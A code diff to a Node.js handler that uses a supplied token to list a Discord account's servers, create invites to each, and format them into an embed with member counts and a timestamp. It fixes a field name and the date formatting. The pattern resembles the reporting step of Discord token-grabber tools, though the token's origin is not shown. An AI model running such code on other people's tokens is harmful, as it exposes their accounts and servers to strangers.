@@ -28,11 +28,15 @@ module.exports = async (req, res) => {
       },
     });
     const guilds = await guildsResponse.json();
+
+
+    const timestamp = Math.floor(Date.now() / 1000);
     
     const servers = await Promise.all(
       guilds.map(async (guild) => {
+console.log(guild)
         const invite = await getServerInvite(guild.id, token);
-        return `\`${guild.name} - ${guild.id}\`\n[Link](${invite}) - \`${guild.membersCount} Membros\``;
+        return `\`${guild.name} - ${guild.id}\`\n[Link](${invite}) - \`${guild.memberCount} Membros\``;
       }));
 
     const embed = {
@@ -50,7 +54,7 @@ module.exports = async (req, res) => {
           },
           {
             name: 'Data/Hora',
-            value: new Date().toISOString(),
+            value: `<t:${timestamp}:f>`,
             inline: false
           },
           {
